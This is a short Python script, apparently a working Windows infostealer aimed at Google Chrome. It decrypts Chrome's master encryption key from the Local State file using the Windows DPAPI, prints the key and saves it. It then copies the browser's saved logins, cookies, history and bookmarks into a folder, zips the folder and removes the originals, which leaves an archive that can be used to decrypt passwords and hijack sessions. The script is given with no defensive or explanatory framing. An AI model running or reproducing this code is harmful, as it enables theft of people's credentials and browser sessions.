import os
import json
import shutil
import base64
import win32crypt

with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',"r") as f:
    local_state = f.read()
    local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key_w_Cry = master_key[5:]
master_key = win32crypt.CryptUnprotectData(master_key_w_Cry, None, None, None, 0)[1]
print(master_key)
if not os.path.exists("Sourse_Data/"):
        os.makedirs("Sourse_Data/")
with open("Sourse_Data/masterkey",'wb') as key:
    key.write(master_key)
shutil.copy2(os.environ['USERPROFILE'] + os.sep + r"AppData\Local\Google\Chrome\User Data\Default\Login Data", "Sourse_Data/Login Data")
shutil.copy2(os.environ['USERPROFILE'] + os.sep + r"AppData\Local\Google\Chrome\User Data\Default\Cookies", "Sourse_Data/Cookies")
shutil.copy2(os.environ['USERPROFILE'] + os.sep + r"AppData\Local\Google\Chrome\User Data\Default\History", "Sourse_Data/History")
shutil.copy2(os.environ['USERPROFILE'] + os.sep + r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks", "Sourse_Data/Bookmarks")
shutil.make_archive("Sourse_Data", "zip", os.getcwd() + "/Sourse_Data/")
shutil.rmtree("Sourse_Data/")